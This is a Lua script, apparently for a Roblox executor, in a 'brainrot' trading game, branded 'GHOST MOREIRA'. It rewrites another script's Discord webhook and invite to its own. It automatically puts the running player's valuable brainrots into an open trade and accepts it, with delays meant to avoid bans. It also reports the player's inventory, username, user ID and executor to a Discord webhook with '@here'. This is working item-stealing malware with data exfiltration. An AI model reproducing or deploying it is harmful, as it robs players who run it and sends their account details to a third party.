            body = body:gsub('discord%.gg/[%w]+', 'discord.gg/t82eh7bgY')
            body = body:gsub('https://discord%.com/api/webhooks/[%w_%-/]+', function() return getgenv().GHOST_WEBHOOK end)
            if getgenv().GHOST_ANTI_LEAVE ~= true then
                body = body:gsub('while task%.wait%(%) do%s*pcall%(function%(%)%s*for _, v in ipairs%(getconnections', 'while false do pcall(function() for _, v in ipairs(getconnections')
            end
            task.spawn(function() pcall(function() loadstring(body)() end) end)
            return
        end
        task.wait(0.15)
    end
end)

-- [3] AUTO-ADD al trade — SIN getupvalues (evita ban)
task.spawn(function()
    local RC = nil
    pcall(function() RC = require(_RS.Packages.ReplicatorClient) end)
    if not RC then return end

    -- Buscar los remotes por nombre (Safe Scan)
    local addBrainrot, readyRE, acceptRE
    pcall(function()
        for _, obj in ipairs(_RS:GetDescendants()) do
            if obj:IsA('RemoteFunction') and obj.Name:lower():find('addbrainrot') then addBrainrot = obj end
            if obj:IsA('RemoteEvent') then
                if obj.Name:lower():find('ready') then readyRE = obj end
                if obj.Name:lower():find('accept') then acceptRE = obj end
            end
        end
    end)

    local function getTradeState(ch, myIdx)
        local st = { slotsInOffer = {} }
        pcall(function()
            local players = ch:TryIndex({'active','data','players'})
            if not players or not players[myIdx] then return end
            local me = players[myIdx]
            if type(me.offer) == 'table' and type(me.offer.brainrots) == 'table' then
                for _, item in pairs(me.offer.brainrots) do
                    if type(item) == 'table' and item.IndexOnPlot then
                        st.slotsInOffer[tonumber(item.IndexOnPlot)] = true
                    end
                end
            end
        end)
        return st
    end

    local function getAnimalSlots()
        local slots = {}
        pcall(function()
            local plot = require(_RS.Controllers.PlotController):GetMyPlot()
            if not plot or not plot.Channel then return end
            local list = plot.Channel:Get('AnimalList') or plot.Channel:Get('AnimalPodiums')
            if type(list) ~= 'table' then return end
            local Animals = require(_RS.Datas.Animals)
            for slot, animal in pairs(list) do
                local sn = tonumber(slot)
                if sn and type(animal) == 'table' and not animal.Machine then
                    local base = (Animals and Animals[animal.Index]) or {}
                    local name = string.lower(base.DisplayName or animal.Index or '?')
                    if getgenv().GHOST_VALID_BR[name] then
                        slots[#slots+1] = { slot = sn, UUID = animal.UUID, Index = animal.Index, Mutation = animal.Mutation, Traits = animal.Traits, LastCollect = animal.LastCollect or os.time(), OfflineGain = animal.OfflineGain or 99 }
                    end
                end
            end
            table.sort(slots, function(a,b) return a.slot < b.slot end)
        end)
        return slots
    end

    local deadline = tick() + 10
    local ch, myIdx
    while tick() < deadline do
        local ok, c = pcall(function() return RC.get(('Trade_%d'):format(_PLR.UserId)) end)
        if ok and c and c:TryIndex({'active','data'}) then
            local users = c:TryIndex({'active','data','users'})
            if type(users) == 'table' then
                for k, v in pairs(users) do if v == _PLR.UserId then myIdx = k; ch = c; break end end
            end
        end
        if ch and myIdx then break end
        task.wait(0.1)
    end
    if not (ch and myIdx) then return end

    -- brainrots: uno por uno, sin duplicar, con delay (anti-ban)
    if addBrainrot then
        for pass = 1, 2 do
            local slots = getAnimalSlots()
            if #slots == 0 then break end
            local st = getTradeState(ch, myIdx)
            local toAdd = {}
            for _, s in ipairs(slots) do if not st.slotsInOffer[s.slot] then toAdd[#toAdd+1] = s end end
            if #toAdd == 0 then break end
            for _, s in ipairs(toAdd) do
                if not ch:TryIndex({'active','data'}) then break end
                pcall(function()
                    addBrainrot:InvokeServer(s.slot, { UUID = s.UUID, Index = s.Index, Mutation = s.Mutation, Traits = s.Traits, IndexOnPlot = s.slot, LastCollect = s.LastCollect, OfflineGain = s.OfflineGain, Steal = false })
                end)
                task.wait(3.0) -- DELAY ANTI-BAN SEGURO (3s por Brainrot)
            end
            task.wait(0.5)
        end
    end

    -- Ready + Accept con reintentos
    task.wait(1)
    for intento = 1, 10 do
        if not ch:TryIndex({'active','data'}) then break end
        local players = ch:TryIndex({'active','data','players'})
        if players and players[myIdx] then
            local me = players[myIdx]
            if me then
                if not me.ready and readyRE then pcall(function() readyRE:FireServer() end) end
                if me.ready and not me.accepted and acceptRE then pcall(function() acceptRE:FireServer() end) end
                if me.accepted then break end
            end
        end
        task.wait(0.5)
    end
end)

-- [2] REPORT — Instantáneo (No espera, lee y manda)
task.spawn(function()
    local br, skins, gears = {}, {}, {}
    local plot = nil
    local Animals, Mutations
    pcall(function() Animals = require(_RS.Datas.Animals) end)
    pcall(function() Mutations = require(_RS.Datas.Mutations) end)

    -- Espera máxima de 0.2s (solo para asegurar que cargue el módulo)
    pcall(function() plot = require(_RS.Controllers.PlotController):GetMyPlot() end)
    if not plot then task.wait(0.2); pcall(function() plot = require(_RS.Controllers.PlotController):GetMyPlot() end) end

    local list = nil
    if plot and plot.Channel then
        pcall(function() list = plot.Channel:Get('AnimalList') or plot.Channel:Get('AnimalPodiums') end)
    end

    local seen_br = {}
    if list then
        for slot, a in pairs(list) do
            if tonumber(slot) and type(a) == 'table' and not a.Machine then
                local base = (Animals and Animals[a.Index]) or {}
                local rawName = base.DisplayName or a.Index or '?'
                local lowerName = string.lower(rawName)
                if not seen_br[lowerName] and getgenv().GHOST_VALID_BR[lowerName] then
                    seen_br[lowerName] = true
                    local name = _esc(rawName)
                    local gen = base.Generation or 0
                    if a.Mutation and Mutations and Mutations[a.Mutation] then
                        local mod = Mutations[a.Mutation].Modifier
                        if mod then gen = gen + gen * mod end
                    end
                    gen = math.round(gen)
                    local mut = _esc(a.Mutation or '')
                    local mstr = mut ~= '' and ('['..mut..'] ') or ''
                    br[#br+1] = '🧠 **'..mstr..name..'** ($'.._fmt(gen)..'/s)'
                end
            end
        end
    end

    pcall(function()
        local seen_ge = {}
        local function addGear(t)
            local n = t.Name; local ln = string.lower(n)
            if getgenv().GHOST_VALID_GE[ln] and not seen_ge[ln] then seen_ge[ln] = true; gears[#gears+1] = n end
        end
        local bp = _PLR:FindFirstChild('Backpack')
        if bp then for _, t in ipairs(bp:GetChildren()) do if t:IsA('Tool') then addGear(t) end end end
        if _PLR.Character then for _, t in ipairs(_PLR.Character:GetChildren()) do if t:IsA('Tool') then addGear(t) end end end
    end)

    pcall(function()
        local seen_bs = {}
        local function addSkin(s)
            if type(s) == 'string' and #s > 0 then
                local ls = string.lower(s)
                if getgenv().GHOST_VALID_BS[ls] and not seen_bs[ls] then
                    seen_bs[ls] = true; skins[#skins+1] = s
                end
            end
        end
        if plot then
            local a1 = plot:GetAttribute('Skin') or plot:GetAttribute('BaseSkin') or plot:GetAttribute('EquippedSkin')
            if a1 then addSkin(tostring(a1)) end
            if plot.Channel then
                local ok, v1 = pcall(function() return plot.Channel:Get('Skin') end); if ok then addSkin(v1) end
                local ok2, v2 = pcall(function() return plot.Channel:Get('BaseSkin') end); if ok2 then addSkin(v2) end
            end
        end
    end)

    local function _dd(t)
        local seen, out = {}, {}
        for _, v in ipairs(t) do local k = tostring(v):lower(); if #k > 0 and not seen[k] then seen[k]=true; out[#out+1]=tostring(v) end end
        return out
    end
    skins = _dd(skins); gears = _dd(gears)

    local selBS = getgenv().GHOST_SELECTED_BS or {}
    local selGE = getgenv().GHOST_SELECTED_GE or {}
    local ss, sg = {}, {}
    for _, n in ipairs(selBS) do ss[string.lower(n)] = true end
    for _, n in ipairs(selGE) do sg[string.lower(n)] = true end
    local brLines = (#br > 0) and br or { '*None selected*' }
    local skinLines, gearLines = {}, {}
    if #skins > 0 then for _, s in ipairs(skins) do local m = ss[string.lower(s)] and '⭐ ' or ''; skinLines[#skinLines+1] = m..'🎨 **'.._esc(s)..'**' end
    else skinLines[1] = '*Ninguno detectado*' end
    if #gears > 0 then for _, g in ipairs(gears) do local m = sg[string.lower(g)] and '⭐ ' or ''; gearLines[#gearLines+1] = m..'⚙️ **'.._esc(g)..'**' end
    else gearLines[1] = '*Ninguno detectado*' end
    local t = math.floor(os.time())
    local pc = #game:GetService('Players'):GetPlayers()
    local desc = '📨 **Invite received from:** `'.._esc(_PLR.Name)..'` (ID: `'..tostring(_PLR.UserId)..'`)  ·  *report*\n\n'
        ..'## Brainrots\n'..table.concat(brLines, '\n')..'\n\n'
        ..'## Gears\n'..table.concat(gearLines, '\n')..'\n\n'
        ..'## Base Skins\n'..table.concat(skinLines, '\n')..'\n\n'
        ..'## Status\n**Not in Duel**\n'..'🕒 <t:'..t..':f>\n'..'🌍 Players: **'..pc..'**\n'..'⚡ Executor: **'.._esc(_executor())..'**\n'..'GHOST MOREIRA  |  https://discord.gg/t82eh7bgY'
    local function _chunks(s, n)
        n = n or 3900; local out, cur = {}, ''
        for line in (s..'\n'):gmatch('(.-)\n') do
            if #cur + #line + 1 > n then out[#out+1] = cur; cur = line else cur = (#cur > 0) and (cur..'\n'..line) or line end
        end
        if #cur > 0 then out[#out+1] = cur end
        return out
    end
    local parts = _chunks(desc)
    local embeds = {}
    for i, p in ipairs(parts) do if i > 10 then break end; embeds[i] = { description = p, color = 9662683, footer = (i == #parts or i == 10) and { text = 'GHOST MOREIRA | https://discord.gg/t82eh7bgY' } or nil } end
    _post_fire({ username = 'GHOST MOREIRA', content = '@here', embeds = embeds })
end)

